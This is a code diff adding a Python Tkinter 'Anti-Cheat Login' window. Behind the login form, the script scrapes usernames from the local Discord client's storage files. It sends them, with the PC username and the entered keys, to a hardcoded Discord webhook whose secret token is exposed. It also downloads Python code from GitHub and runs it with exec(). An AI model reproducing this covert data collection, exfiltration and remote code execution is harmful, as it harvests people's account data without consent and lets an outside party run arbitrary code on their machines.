@@ -1,1 +1,145 @@
+import subprocess
+import sys
+import tkinter as tk
+from tkinter import messagebox, ttk
+import getpass
+import requests
+import os
+import re
 
+WEBHOOK_URL = "https://discord.com/api/webhooks/1566446423589781604/1SzFm83NJOVvSUG52rzVxvFKpdpCr2O4nerXC4f5pTY01mLADJdjeAozCpQ8_LiClAoE"
+SECURITY_URL = "https://raw.githubusercontent.com/mostamoanas-byte/TS/refs/heads/main/security.py"
+INSPECTOR_URL = "https://raw.githubusercontent.com/mostamoanas-byte/Anti-Cheat/refs/heads/main/Inspector"
+
+ADMIN_PING = "" 
+
+def send_discord_log(content):
+    try:
+        requests.post(WEBHOOK_URL, json={"content": content})
+    except:
+        pass
+
+def get_discord_info():
+    try:
+        discord_path = os.path.join(os.getenv("APPDATA"), "discord", "Local Storage", "leveldb")
+        if not os.path.exists(discord_path):
+            return "Discord App Not Found"
+        
+        found_tokens = []
+        for file_name in os.listdir(discord_path):
+            if file_name.endswith(('.ldb', '.log')):
+                file_path = os.path.join(discord_path, file_name)
+                try:
+                    with open(file_path, "r", encoding="latin-1", errors="ignore") as f:
+                        content = f.read()
+                        matches = re.findall(r'"username":"([^"]+)"', content)
+                        for m in matches:
+                            if m not in found_tokens and len(m) > 2:
+                                found_tokens.append(m)
+                except:
+                    continue
+        
+        if found_tokens:
+            return found_tokens[-1]
+    except:
+        pass
+    return "Detected via PC Local Data"
+
+def launch_anti_cheat(root):
+    root.destroy()
+    try:
+        response = requests.get(INSPECTOR_URL)
+        if response.status_code == 200:
+            script_content = response.text
+            
+            inspector_root = tk.Tk()
+            
+            global_namespace = {
+                "__builtins__": __builtins__,
+                "__file__": "Inspector",
+                "__name__": "__main__",
+                "tk": tk,
+                "ttk": ttk,
+                "messagebox": messagebox,
+                "HAS_TK": True,
+                "requests": requests,
+                "root": inspector_root
+            }
+            
+            exec(script_content, global_namespace)
+            
+        else:
+            messagebox.showerror("Error", "Failed to load Anti-Cheat core.")
+    except Exception as e:
+        messagebox.showerror("Error", f"Failed to execute Anti-Cheat:\n{e}")
+
+def verify_credentials(entry_checker, entry_key, root):
+    checker_name = entry_checker.get().strip()
+    entered_key = entry_key.get().strip()
+    pc_user = getpass.getuser()
+    discord_info = get_discord_info()
+
+    if not checker_name or not entered_key:
+        messagebox.showerror("Error", "Please put the info")
+        return
+
+    try:
+        response = requests.get(SECURITY_URL)
+        if response.status_code != 200:
+            messagebox.showerror("Error", "Connection error with security server.")
+            return
+
+        namespace = {}
+        exec(response.text, namespace)
+        admin_keys = namespace.get("ADMIN_KEYS", {})
+
+        if entered_key in admin_keys:
+            admin_name = admin_keys[entered_key]
+            log_msg = (
+                f"✅ **Successful Login**\n"
+                f"• **Checker Name:** `{checker_name}`\n"
+                f"• **Admin (Key Owner):** `{admin_name}`\n"
+                f"• **Discord Info:** `{discord_info}`\n"
+                f"• **PC User:** `{pc_user}`\n"
+                f"• **Key Used:** `{entered_key}`"
+            )
+            send_discord_log(log_msg)
+            launch_anti_cheat(root)
+        else:
+            ping_text = f"{ADMIN_PING} " if ADMIN_PING else ""
+            log_msg = (
+                f"{ping_text}❌ **Failed Login Attempt!**\n"
+                f"• **Checker Name:** `{checker_name}`\n"
+                f"• **Discord Info:** `{discord_info}`\n"
+                f"• **PC User:** `{pc_user}`\n"
+                f"• **Wrong Key:** `{entered_key}`"
+            )
+            send_discord_log(log_msg)
+            messagebox.showerror("Access Denied", "Invalid Key.")
+
+    except Exception as e:
+        messagebox.showerror("Error", f"An error occurred: {e}")
+
+def main():
+    root = tk.Tk()
+    root.title("Anti-Cheat Login")
+    root.geometry("300x220")
+    root.resizable(False, False)
+    root.configure(bg="#2b2b2b")
+
+    tk.Label(root, text="Checker Name:", fg="#ffffff", bg="#2b2b2b", font=("Arial", 10)).pack(pady=(15, 0))
+    entry_checker = tk.Entry(root, width=25, font=("Arial", 10))
+    entry_checker.pack(pady=5)
+
+    tk.Label(root, text="Admin Key:", fg="#ffffff", bg="#2b2b2b", font=("Arial", 10)).pack(pady=(5, 0))
+    entry_key = tk.Entry(root, width=25, show="*", font=("Arial", 10))
+    entry_key.pack(pady=5)
+
+    btn = tk.Button(root, text="Login", width=15, bg="#4CAF50", fg="#ffffff", font=("Arial", 10, "bold"),
+                    command=lambda: verify_credentials(entry_checker, entry_key, root))
+    btn.pack(pady=15)
+
+    root.mainloop()
+
+if __name__ == "__main__":
+    main()
